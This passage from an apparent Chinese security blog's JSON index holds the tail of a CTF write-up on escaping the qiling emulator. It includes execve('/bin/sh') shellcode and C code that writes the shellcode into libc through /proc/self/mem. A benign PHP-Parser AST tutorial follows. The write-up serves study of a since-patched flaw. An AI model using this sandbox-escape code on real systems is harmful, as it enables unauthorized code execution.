\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\"; unsigned char code[] = \"\\x6a\\x68\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x2f\\x73\\x50\\x48\\x89\\xe7\\x68\\x72\\x69\\x1\\x1\\x81\\x34\\x24\\x1\\x1\\x1\\x1\\x31\\xf6\\x56\\x6a\\x8\\x5e\\x48\\x1\\xe6\\x56\\x48\\x89\\xe6\\x31\\xd2\\x6a\\x3b\\x58\\xf\\x5\"; int main() { char buf[4096] = \"0\"; int fd = open(\"/proc/self/maps\", O_RDONLY); int fd_mem = open(\"/proc/self/mem\", O_RDWR); FILE *fp_map = fdopen(fd, \"r\"); unsigned long addr = 0; while(1) { fgets(buf, sizeof buf, fp_map); if (strstr(buf, \"r-xp\")!=NULL &amp;&amp; strstr(buf, \"libc-\")) { sscanf(buf, \"%lx-\", &amp;addr); break; } } lseek(fd_mem, addr, SEEK_SET); for (int i=0; i&lt;150; i++) { write(fd_mem, nop, sizeof nop - 1); } write(fd_mem, code, sizeof code); return 0; } 不过大家可能会好奇，mem的权限为啥允许写入shellcode： 答案可以参考这篇文章： https://www.anquanke.com/post/id/257350#h2-0 至此，我们其实就拥有了整个攻击链，先进行目录穿越找到/proc/self/mem，然后写入shellcode。 int main() { long start_addr; // Open mappings int map = openat(1, \"/proc/self/maps\", O_RDONLY); // Open Python process memory int mem = openat(1, \"/proc/self/mem\", O_RDWR); FILE *fp_map = fdopen(map, \"r\"); // Find the first executable mapping for Libc char line[4096]; while (fgets(line, sizeof line, fp_map)) { size_t len = strlen(line); if (strstr(line, \"r-xp\") != NULL &amp;&amp; strstr(line, \"libc-\")) { // Retrive start address of mapping sscanf(line, \"%lx-\", &amp;start_addr); printf(\"%lx\\n\", start_addr); break; } } // Seek to the address of the executable mapping for Libc lseek(mem, start_addr, SEEK_SET); for(int i=0; i &lt; 3; i++) { write(mem, nop, sizeof nop -1); } // Write the payload into the executable mapping write(mem, code, sizeof code); return 0; } shellcode就不贴了，占地方，可以参考上面那个demo里面的。 总结​这个题目本身算是一个容器逃逸的题目，qiling在实现自己的rootfs的时候对系统调用的检测不严格是问题的根源。官方也及时进行了修复： https://github.com/qilingframework/qiling/pull/1076/commits/6d0fc4a81880abc2984552ccd23497d8832d00fe","categories":[{"name":"CTF","slug":"CTF","permalink":"https://rainsec.cn/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rainsec.cn/tags/CTF/"}],"author":"Clock"},{"title":"PHP-Parser的基本使用","slug":"PHP-Parser","date":"2022-01-28T10:38:45.000Z","updated":"2022-07-20T08:20:45.855Z","comments":true,"path":"/post/PHP-Parser.html","link":"","permalink":"https://rainsec.cn/post/PHP-Parser.html","excerpt":"PHP-ParserPHP-Parser组件的基础使用，该组件为静态分析和反混淆常用的第三方依赖。","text":"PHP-ParserPHP-Parser组件的基础使用，该组件为静态分析和反混淆常用的第三方依赖。 What is PHP-ParserPHP-Parser是nikic用PHP编写的PHP5.2到PHP7.4解析器，其目的是简化静态代码分析和操作 PHP-Parser的基础使用这里先贴一下官方文档 PHP-Parser/doc at master · nikic/PHP-Parser (github.com) 最基本的是要理解其中Walking the AST的部分 初始化解析器首先创建实例 use PhpParser\\ParserFactory; $parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7); 这其中有以下参数 KindBehaviorParserFactory::PREFER_PHP7Try to parse code as PHP 7. If this fails, try to parse it as PHP 5.ParserFactory::PREFER_PHP5Try to parse code as PHP 5. If this fails, try to parse it as PHP 7.ParserFactory::ONLY_PHP7Parse code as PHP 7.ParserFactory::ONLY_PHP5Parse code as PHP 5. create还有一个参数Lexer，这里先不做讨论 在实例化之后我们就可以通过 $stmts = $parser-&gt;parse($code); 来将代码转换成AST 为了防止抛出异常，最好在try….catch中执行 生成更加直观的AST当我们var_dump上面的$stmt时，会得到一个比较乱的AST，可以使用NodeDump将其转化为更加直观的AST 这里需要使用NodeDump 对于代码 &lt;?php function printLine($msg) { echo $msg, \"\\n\"; } printLine('Hello World!!!'); 将其转换为AST &lt;?php use PhpParser\\NodeDumper; $nodeDumper = new NodeDumper;echo $nodeDumper-&gt;dump($stmts), \"\\n\"; 得到以下输出 array( 0: Stmt_Function( byRef: false name: Identifier( name: printLine ) params: array( 0: Param( type: null byRef: false variadic: false var: Expr_Variable( name: msg ) default: null ) ) returnType: null stmts: array( 0: Stmt_Echo( exprs: array( 0: Expr_Variable( name: msg ) 1: Scalar_String( value: ) ) ) ) ) 1: Stmt_Expression( expr: Expr_FuncCall( name: Name( parts: array( 0: printLine ) ) args: array( 0: Arg( value: Scalar_String( value: Hello World!!! ) byRef: false unpack: false ) ) ) ) ) Node tree structure上面我们可以看到生成了很多的Node类型 PHP是一个成熟的脚本语言，它大约有140个不同的节点。但是为了方便使用，将他们分为三类： PhpParser\\Node\\Stmts是语句节点，即不返回值且不能出现在表达式中的语言构造。例如，类定义是一个语句，它不返回值，你不能编写类似func(class {})的语句。 PhpParser\\Node\\expr是表达式节点，即返回值的语言构造，因此可以出现在其他表达式中。如：$var (PhpParser\\Node\\Expr\\Variable)和func() (PhpParser\\Node\\Expr\\FuncCall)。 PhpParser\\Node\\Scalars是表示标量值的节点，如\"string\" (PhpParser\\Node\\scalar\\string)、0 (PhpParser\\Node\\scalar\\LNumber) 或魔术常量，如”FILE“ (PhpParser\\Node\\scalar\\MagicConst\\FILE) 。所有PhpParser\\Node\\scalar都是延伸自PhpParser\\Node\\Expr，因为scalar也是表达式。 需要注意的是PhpParser\\Node\\Name和PhpParser\\Node\\Arg不在以上的节点之中 Pretty printerPrettyprinter用来将我们修改后的AST转换回PHP代码，使用如下 use PhpParser\\Error; use PhpParser\\ParserFactory; use PhpParser\\PrettyPrinter; $code = \"&lt;?php echo 'Hi ', hi\\\\getTarget();\"; $parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);$prettyPrinter = new PrettyPrinter\\Standard; try { //生成AST $stmts = $parser-&gt;parse($code); //对节点进行操作 $stmts[0] // the echo statement -&gt;exprs // sub expressions [0] // the first of them (the string node) -&gt;value // it's value, i.e. 'Hi ' = 'Hello '; // change to 'Hello ' // pretty print $code = $prettyPrinter-&gt;prettyPrint($stmts); echo $code; } catch (Error $e) { echo 'Parse Error: ', $e-&gt;getMessage(); } 在反混淆中我们一般很少使用$stmts[0]这种方式，因为我们要考虑节点的各种类型 此外还有prettyPrintExpr()，它可以用来输出一个表达式类型的节点 例如当你需要提取全局变量时 &lt;?php $a = $_POST['a']; 他的语法树如下 0: Stmt_Expression( expr: Expr_Assign( var: Expr_Variable( name: a ) expr: Expr_ArrayDimFetch( var: Expr_Variable( name: _POST ) dim: Scalar_String( value: a ) ) ) ) 如果我想获取$_POST[‘a’],我就需要先判断节点类型是不是Expr_ArrayDimFetch 然后判断$node-&gt;var-&gt;name是不是全局变量 最后提取$node-&gt;var-&gt;name和$node-&gt;dim-&gt;value然后将它们拼接 当我的全局变量为$_POST[a]时，dim部分的AST也会变化，我们还需要考虑这种情况。 但是我们可以使用 /* 用来识别全局变量; 如果要获取全局变量格式无需考虑value的节点类型 expr: Expr_ArrayDimFetch( var: Expr_Variable( name: _POST ) ) */ if ($node instanceof Node\\Expr\\ArrayDimFetch &amp;&amp; $node-&gt;var instanceof Node\\Expr\\Variable &amp;&amp; (in_array($node-&gt;var-&gt;name ,GLOBAL_VAR))) { self::$globalname = $this-&gt;prettyPrinter-&gt;prettyPrintExpr($node); } 其中 $this-&gt;prettyPrinter-&gt;prettyPrintExpr($node); 就会返回该Expr节点的表达式，无论是$_POST['a']还是$_POST[a]都可以正常返回 PHP-Parser/Pretty_printing.markdown at master · nikic/PHP-Parser (github.com) Node traversation我们使用PHP-Parser对文件的节点进行修改，最关键的就是编写节点遍历操作 使用PhpParser\\NodeTraverser我们可以遍历每一个节点，举几个简单的例子：解析php中的所有字符串，并输出 &lt;?php use PhpParser\\Error; use PhpParser\\ParserFactory; use PhpParser\\NodeTraverser; use PhpParser\\NodeVisitorAbstract; use PhpParser\\Node; require 'vendor/autoload.php'; class MyVisitor extends NodeVisitorAbstract{ public function leaveNode(Node $node) { //判断如果是一个String_节点，就输出 if ($node instanceof Node\\Scalar\\String_) { echo $node -&gt; value,\"\\n\"; } } } $code = file_get_contents(\"./test.php\"); //实例化解释器 $parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7); $traverser = New NodeTraverser; //添加自己的Visitor $traverser-&gt;addVisitor(new MyVisitor); try { //转化AST $ast = $parser-&gt;parse($code); //开始遍历 $stmts = $traverser-&gt;traverse($ast); } catch (Error $error) { echo \"Parse error: {$error-&gt;getMessage()}\\n\"; return; } ?&gt; 替换php脚本中函数以及类的成员方法函数名为小写 class MyVisitor extends NodeVisitorAbstract{ public function leaveNode(Node $node) { if( $node instanceof Node\\Expr\\FuncCall) { $node-&gt;name-&gt;parts[0]=strtolower($node-&gt;name-&gt;parts[0]); }elseif($node instanceof Node\\Stmt\\ClassMethod){ $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name); }elseif ($node instanceof Node\\Stmt\\Function_){ $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name); }elseif($node instanceof Node\\Expr\\MethodCall){ $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name); } } } 需要注意的是所有的visitors都必须实现PhpParser\\NodeVisitor接口，该接口定义了如下4个方法： public function beforeTraverse(array $nodes); public function enterNode(\\PhpParser\\Node $node); public function leaveNode(\\PhpParser\\Node $node); public function afterTraverse(array $nodes); beforeTraverse方法在遍历开始之前调用一次，并将其传递给调用遍历器的节点。此方法可用于在遍历之前重置值或准备遍历树。 afterTraverse方法与beforeTraverse方法类似，唯一的区别是它只在遍历之后调用一次。 在每个节点上都调用enterNode和leaveNode方法，前者在它被输入时，即在它的子节点被遍历之前，后者在它被离开时。 这四个方法要么返回更改的节点，要么根本不返回(即null)，在这种情况下，当前节点不更改。 例子基于 AST（抽象语法树）解 PHP 混淆 | J0k3r’s Blog P.S.我们需要知道你需要什么样的Node，进行什么样的操作，Node下数据的格式会有哪几种情况，会不会因为代码不够严谨导致错误或者无限递归","categories":[{"name":"Zitui","slug":"Zitui","permalink":"https://rainsec.cn/categories/Zitui/"},{"name":"PHP","slug":"Zitui/PHP","permalink":"https://rainsec.cn/categories/Zitui/PHP/"}],"tags":[{"name":"PHP-Parser","slug":"PHP-Parser","permalink":"https://rainsec.cn/tags/PHP-Parser/"}],"author":"Zitui"}],"categories":[{"name":"Linux","slug":"Linux","permalink":"https://rainsec.cn/categories/Linux/"},{"name":"Kernel","slug":"Linux/Kernel","permalink":"https://rainsec.cn/categories/Linux/Kernel/"},{"name":"Zitui","slug":"Zitui","permalink":"https://rainsec.cn/categories/Zitui/"},{"name":"Ubuntu","slug":"Zitui/Ubuntu","permalink":"https://rainsec.cn/categories/Zitui/Ubuntu/"},{"name":"Clock","slug":"Clock","permalink":"https://rainsec.cn/categories/Clock/"},{"name":"Golang","slug":"Clock/Golang","permalink":"https://rainsec.cn/categories/Clock/Golang/"},{"name":"Noel","slug":"Noel","permalink":"https://rainsec.cn/categories/Noel/"},{"name":"Web","slug":"Noel/Web","permalink":"https://rainsec.cn/categories/Noel/Web/"},{"name":"CTF","slug":"CTF","permalink":"https://rainsec.cn/categories/CTF/"},{"name":"PHP","slug":"Zitui/PHP","permalink":"https://rainsec.cn/categories/Zitui/PHP/"}],"tags":[{"name":"Kernel","slug":"Kernel","permalink":"https://rainsec.cn/tags/Kernel/"},{"name":"Linux","slug":"Linux","permalink":"https://rainsec.cn/tags/Linux/"},{"name":"Fuzz","slug":"Fuzz","permalink":"https://rainsec.cn/tags/Fuzz/"},{"name":"XSS","slug":"XSS","permalink":"https://rainsec.cn/tags/XSS/"},{"name":"CTF","slug":"CTF","permalink":"https://rainsec.cn/tags/CTF/"},{"name":"PHP-Parser","slug":"PHP-Parser","permalink":"https://rainsec.cn/tags/PHP-Parser/"}]}